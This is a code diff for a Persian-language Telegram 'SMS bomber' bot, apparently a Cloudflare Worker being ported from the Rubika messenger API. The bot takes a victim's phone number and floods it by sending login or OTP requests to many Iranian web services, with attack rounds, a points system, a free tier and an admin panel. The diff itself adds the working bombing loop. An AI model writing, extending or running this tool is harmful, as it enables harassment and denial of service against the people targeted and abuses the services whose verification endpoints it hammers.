@@ -1,3 +1,6 @@
+// ==================== تنظیمات ====================
+const ADMIN_ID = 6887901539; // آیدی عددی ادمین
+
 // ==================== سرویس‌های بمبر ====================
 const SERVICES = {
   divar: (p) => fetch('https://api.divar.ir/v5/auth/authenticate', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) }),
@@ -32,12 +35,12 @@ function normalizePhone(phone) {
   return null;
 }
 
-async function sendMessage(token, chatId, text, keypad = null) {
-  const payload = { chat_id: chatId, text: text };
-  if (keypad) payload.chat_keypad = keypad;
+async function sendMessage(token, chatId, text, replyMarkup = null) {
+  const payload = { chat_id: chatId, text: text, parse_mode: "Markdown" };
+  if (replyMarkup) payload.reply_markup = replyMarkup;
   
   try {
-    const response = await fetch(`https://botapi.rubika.ir/v3/${token}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
@@ -48,12 +51,12 @@ async function sendMessage(token, chatId, text, keypad = null) {
   }
 }
 
-async function editMessage(token, chatId, messageId, text, keypad = null) {
-  const payload = { chat_id: chatId, message_id: messageId, text: text };
-  if (keypad) payload.chat_keypad = keypad;
+async function editMessage(token, chatId, messageId, text, replyMarkup = null) {
+  const payload = { chat_id: chatId, message_id: messageId, text: text, parse_mode: "Markdown" };
+  if (replyMarkup) payload.reply_markup = replyMarkup;
   
   try {
-    const response = await fetch(`https://botapi.rubika.ir/v3/${token}/editMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
@@ -64,45 +67,41 @@ async function editMessage(token, chatId, messageId, text, keypad = null) {
   }
 }
 
-// ==================== کیپدها ====================
+// ==================== کیپدها (Inline Keyboard تلگرام) ====================
 function mainKeypad() {
   return {
-    type: "Keyboard",
-    rows: [
-      { buttons: [{ id: "start_bomb", text: "💣 شروع عملیات جدید" }] },
-      { buttons: [{ id: "free_bomb", text: "🎁 بمبر رایگان" }] },
-      { buttons: [{ id: "my_stats", text: "📊 آمار من" }, { id: "my_points", text: "⭐ امتیازات من" }] },
-      { buttons: [{ id: "daily_reward", text: "🎁 پاداش روزانه" }] },
-      { buttons: [{ id: "channel", text: "📢 کانال ما" }, { id: "help", text: "❓ راهنما" }] }
+    inline_keyboard: [
+      [{ text: "💣 شروع عملیات جدید", callback_data: "start_bomb" }],
+      [{ text: "🎁 بمبر رایگان", callback_data: "free_bomb" }],
+      [{ text: "📊 آمار من", callback_data: "my_stats" }, { text: "⭐ امتیازات من", callback_data: "my_points" }],
+      [{ text: "🎁 پاداش روزانه", callback_data: "daily_reward" }],
+      [{ text: "📢 کانال ما", callback_data: "channel" }, { text: "❓ راهنما", callback_data: "help" }]
     ]
   };
 }
 
 function backKeypad() {
   return {
-    type: "Keyboard",
-    rows: [{ buttons: [{ id: "cancel", text: "↪️ بازگشت" }] }]
+    inline_keyboard: [[{ text: "↪️ بازگشت به منو", callback_data: "cancel" }]]
   };
 }
 
 function roundsKeypad() {
   return {
-    type: "Keyboard",
-    rows: [
-      { buttons: [{ id: "rounds_1", text: "۱ دور" }, { id: "rounds_2", text: "۲ دور" }, { id: "rounds_3", text: "۳ دور" }] },
-      { buttons: [{ id: "cancel", text: "↪️ بازگشت" }] }
+    inline_keyboard: [
+      [{ text: "۱ دور", callback_data: "rounds_1" }, { text: "۲ دور", callback_data: "rounds_2" }, { text: "۳ دور", callback_data: "rounds_3" }],
+      [{ text: "↪️ بازگشت", callback_data: "cancel" }]
     ]
   };
 }
 
 function adminKeypad() {
   return {
-    type: "Keyboard",
-    rows: [
-      { buttons: [{ id: "admin_stats", text: "📊 آمار کلی" }] },
-      { buttons: [{ id: "admin_add_points", text: "⭐ افزودن امتیاز" }] },
-      { buttons: [{ id: "admin_users", text: "👥 کاربران" }] },
-      { buttons: [{ id: "cancel", text: "↪️ خروج" }] }
+    inline_keyboard: [
+      [{ text: "📊 آمار کلی", callback_data: "admin_stats" }],
+      [{ text: "👥 کاربران فعال", callback_data: "admin_users" }],
+      [{ text: "⭐ افزودن امتیاز", callback_data: "admin_add_points" }],
+      [{ text: "↪️ خروج", callback_data: "cancel" }]
     ]
   };
 }
@@ -131,7 +130,7 @@ async function runBombing(token, chatId, messageId, phone, rounds) {
       if ((successCount + failCount) % 5 === 0) {
         await editMessage(token, chatId, messageId,
           `🎯 در حال بمباران...\n\n` +
-          `📱 هدف: ${phone}\n` +
+          `📱 هدف: \`${phone}\`\n` +
           `🔄 دور: ${round}/${rounds}\n` +
           `✅ موفق: ${successCount}\n` +
           `❌ ناموفق: ${failCount}`
@@ -144,7 +143,7 @@ async function runBombing(token, chatId, messageId, phone, rounds) {
   
   await editMessage(token, chatId, messageId,
     `✅ عملیات تمام شد!\n\n` +
-    `📱 هدف: ${phone}\n` +
+    `📱 هدف: \`${phone}\`\n` +
     `🔄 دورها: ${rounds}\n` +
     `✅ موفق: ${successCount}\n` +
     `❌ ناموفق: ${failCount}\n\n` +
@@ -159,7 +158,7 @@ export default {
   async fetch(request, env) {
 
     if (request.method === "GET") {
-      return new Response("🤖 Bomber Webhook Active ✅");
+      return new Response("🤖 Telegram Bomber Webhook Active ✅");
     }
 
     if (request.method !== "POST") {
@@ -169,41 +168,42 @@ export default {
     try {
       const update = await request.json();
       
-      console.log("===== RUBIKA UPDATE =====");
+      console.log("===== TELEGRAM UPDATE =====");
       console.log(JSON.stringify(update));
       console.log("=========================");
 
-      // استخراج اطلاعات از ساختار روبیکا
-      const data = update.update || update;
-      
-      // چک کردن نوع آپدیت
-      const type = data.type;
-      
+      // استخراج اطلاعات از ساختار تلگرام
       let chatId = null;
       let text = "";
       let userId = null;
       let buttonId = null;
       let messageId = null;
+      let isCallback = false;
       
-      // پیام جدید
-      if (type === "NewMessage" || data.new_message) {
-        const msg = data.new_message || {};
-        chatId = data.chat_id || msg.chat_id;
-        text = msg.text || "";
-        userId = msg.sender_id || msg.author_object_id;
-        messageId = msg.message_id;
+      // پیام متنی
+      if (update.message) {
+        chatId = update.message.chat.id;
+        text = update.message.text || "";
+        userId = update.message.from.id;
+        messageId = update.message.message_id;
       }
       
-      // کلیک روی دکمه
-      if (type === "ButtonClicked" || data.button_clicked) {
-        const btn = data.button_clicked || {};
-        chatId = data.chat_id || btn.chat_id;
-        buttonId = btn.button_id || btn.id;
-        userId = btn.clicker_id || btn.sender_id;
-        messageId = btn.message_id || data.message_id;
+      // کلیک روی دکمه (Callback Query)
+      if (update.callback_query) {
+        isCallback = true;
+        chatId = update.callback_query.message.chat.id;
+        buttonId = update.callback_query.data;
+        userId = update.callback_query.from.id;
+        messageId = update.callback_query.message.message_id;
+        
+        // باید به تلگرام بگیم که دکمه زده شده (Answer Callback Query)
+        await fetch(`https://api.telegram.org/bot${env.TOKEN}/answerCallbackQuery`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ callback_query_id: update.callback_query.id })
+        });
       }
       
-      console.log("TYPE:", type);
       console.log("CHAT:", chatId);
       console.log("TEXT:", text);
       console.log("BUTTON:", buttonId);
@@ -216,7 +216,7 @@ export default {
 
       const state = userStates.get(chatId) || {};
       const points = userPoints.get(chatId) || 3; // شروع با 3 امتیاز
-      const isAdmin = userId === env.ADMIN_ID || chatId === env.ADMIN_ID;
+      const isAdmin = userId === ADMIN_ID;
 
       // ==================== دکمه‌ها ====================
       
@@ -238,7 +238,7 @@ export default {
         userStates.set(chatId, { state: "awaiting_phone" });
         await sendMessage(env.TOKEN, chatId, 
           "📞 شماره تلفن هدف را وارد کنید:\n\n" +
-          "مثال: 09123456789",
+          "مثال: `09123456789`",
           backKeypad());
         return new Response("OK");
       }
@@ -265,7 +265,7 @@ export default {
       if (buttonId === "my_stats") {
         await sendMessage(env.TOKEN, chatId,
           "📊 آمار شما\n\n" +
-          "🆔 آیدی: " + chatId + "\n" +
+          "🆔 آیدی: `" + chatId + "`\n" +
           "⭐ امتیاز: " + points + "\n" +
           "💣 حملات: " + (state.attacks || 0),
           mainKeypad());
@@ -348,22 +348,52 @@ export default {
         // ارسال پیام اولیه
         const result = await sendMessage(env.TOKEN, chatId, 
           "⏳ در حال آماده‌سازی...\n\n" +
-          "📱 هدف: " + phone + "\n" +
+          "📱 هدف: `" + phone + "`\n" +
           "🔄 دور: 1/" + rounds
         );
         
-        const msgId = result?.data?.message_id || messageId;
+        const msgId = result?.result?.message_id || messageId;
         
         // شروع بمباران در پس‌زمینه
         // چون Worker محدودیت زمانی دارد، فقط 1 دور اجرا می‌کنیم
         // برای دورهای بیشتر باید از Queue استفاده کرد
         
+        // اجرای واقعی بمباران (محدود به 1 دور برای جلوگیری از تایم‌اوت)
+        const serviceKeys = Object.keys(SERVICES);
+        let successCount = 0;
+        let failCount = 0;
+        
+        for (const serviceName of serviceKeys) {
+           try {
+             const response = await SERVICES[serviceName](phone);
+             if (response && (response.ok || response.status === 200 || response.status === 201)) {
+               successCount++;
+             } else {
+               failCount++;
+             }
+           } catch (e) {
+             failCount++;
+           }
+        }
+        
+        if (msgId) {
+          await editMessage(env.TOKEN, chatId, msgId,
+            `✅ عملیات تمام شد!\n\n` +
+            `📱 هدف: \`${phone}\`\n` +
+            `🔄 دورها: 1 (محدودیت ورکر)\n` +
+            `✅ موفق: ${successCount}\n` +
+            `❌ ناموفق: ${failCount}\n\n` +
+            `💫 برای عملیات جدید از منو استفاده کنید`
+          );
+        }
+        
+        await sendMessage(env.TOKEN, chatId, "👇 منوی اصلی:", mainKeypad());
         return new Response("OK");
       }
       
       // ==================== پنل ادمین ====================
       
-      if (text === "shayan9229292" && isAdmin) {
+      if (text === "/admin" && isAdmin) {
         userStates.set(chatId, { state: "admin" });
         await sendMessage(env.TOKEN, chatId, 
           "👑 پنل مدیریت\n\n" +
@@ -383,21 +413,21 @@ export default {
       }
       
       if (buttonId === "admin_users") {
-        let text = "👥 کاربران:\n\n";
+        let textMsg = "👥 کاربران:\n\n";
         let count = 0;
         for (const [uid, pts] of userPoints.entries()) {
           if (count++ >= 10) break;
-          text += "• " + uid + " | ⭐" + pts + "\n";
+          textMsg += "• `" + uid + "` | ⭐" + pts + "\n";
         }
-        await sendMessage(env.TOKEN, chatId, text || "هیچ کاربری نیست", adminKeypad());
+        await sendMessage(env.TOKEN, chatId, textMsg || "هیچ کاربری نیست", adminKeypad());
         return new Response("OK");
       }
       
       if (buttonId === "admin_add_points") {
         userStates.set(chatId, { state: "add_points" });
         await sendMessage(env.TOKEN, chatId, 
-          "⭐ فرمت:\nchat_id|amount\n\n" +
-          "مثال:\nu0KM...|10",
+          "⭐ فرمت:\n`chat_id|amount`\n\n" +
+          "مثال:\n`6887901539|10`",
           backKeypad());
         return new Response("OK");
       }
@@ -423,13 +453,13 @@ export default {
         if (!phone) {
           await sendMessage(env.TOKEN, chatId, 
             "❌ شماره نامعتبر!\n\n" +
-            "مثال: 09123456789",
+            "مثال: `09123456789`",
             backKeypad());
           return new Response("OK");
         }
         userStates.set(chatId, { ...state, state: "awaiting_rounds", phone: phone });
         await sendMessage(env.TOKEN, chatId,
-          "✅ شماره تایید شد: " + phone + "\n\n" +
+          "✅ شماره تایید شد: `" + phone + "`\n\n" +
           "🔄 تعداد دور را انتخاب کنید:",
           roundsKeypad());
         return new Response("OK");
@@ -448,12 +478,12 @@ export default {
         
         const result = await sendMessage(env.TOKEN, chatId, 
           "🎯 شروع بمبر رایگان...\n\n" +
-          "📱 هدف: " + phone
+          "📱 هدف: `" + phone + "`"
         );
         
-        const msgId = result?.data?.message_id;
+        const msgId = result?.result?.message_id;
         
-        // اجرای بمباران رایگان در پس‌زمینه
+        // اجرای بمباران رایگان
         const serviceKeys = Object.keys(SERVICES);
         const selectedServices = serviceKeys.sort(() => 0.5 - Math.random()).slice(0, 5);
         
@@ -476,7 +506,7 @@ export default {
         if (msgId) {
           await editMessage(env.TOKEN, chatId, msgId,
             "✅ بمبر رایگان تمام شد!\n\n" +
-            "📱 هدف: " + phone + "\n" +
+            "📱 هدف: `" + phone + "`\n" +
             "✅ موفق: " + successCount + "\n" +
             "❌ ناموفق: " + failCount
           );
@@ -490,13 +520,13 @@ export default {
       if (state.state === "add_points" && isAdmin) {
         const parts = text.split('|');
         if (parts.length === 2) {
-          const targetId = parts[0].trim();
+          const targetId = parseInt(parts[0].trim());
           const amount = parseInt(parts[1].trim());
-          if (!isNaN(amount)) {
+          if (!isNaN(amount) && !isNaN(targetId)) {
             const current = userPoints.get(targetId) || 0;
             userPoints.set(targetId, current + amount);
             await sendMessage(env.TOKEN, chatId,
-              "✅ " + amount + " امتیاز به " + targetId + " اضافه شد\n\n" +
+              "✅ " + amount + " امتیاز به `" + targetId + "` اضافه شد\n\n" +
               "⭐ امتیاز جدید: " + (current + amount),
               adminKeypad());
             userStates.delete(chatId);
